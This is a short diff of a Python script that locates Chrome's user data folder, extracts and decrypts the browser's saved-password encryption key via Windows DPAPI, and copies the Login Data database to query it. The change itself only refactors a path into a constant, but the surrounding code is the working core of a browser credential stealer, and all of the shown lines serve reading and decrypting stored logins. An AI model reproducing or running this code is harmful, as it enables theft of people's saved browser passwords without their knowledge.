@@ -6,8 +6,10 @@ import shutil
 import sqlite3
 from Crypto.Cipher import AES
 
+USERDATA = os.getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data"
+
 # Encryption key
-local_state = open(os.getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", "r").read()
+local_state = open(USERDATA + "\\Local State", "r").read()
 
 encryption_key = json.loads(local_state)["os_crypt"]["encrypted_key"]
 encryption_key = base64.b64decode(encryption_key)
@@ -16,7 +18,7 @@ encryption_key = win32crypt.CryptUnprotectData(encryption_key[5:], None, None, N
 # Login data
 db_name = "Loginvault.db"
 
-chrome_path_login_db = os.getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+chrome_path_login_db = USERDATA + "\\Default\\Login Data"
 shutil.copy2(chrome_path_login_db, db_name)
 
 conn = sqlite3.connect(db_name)
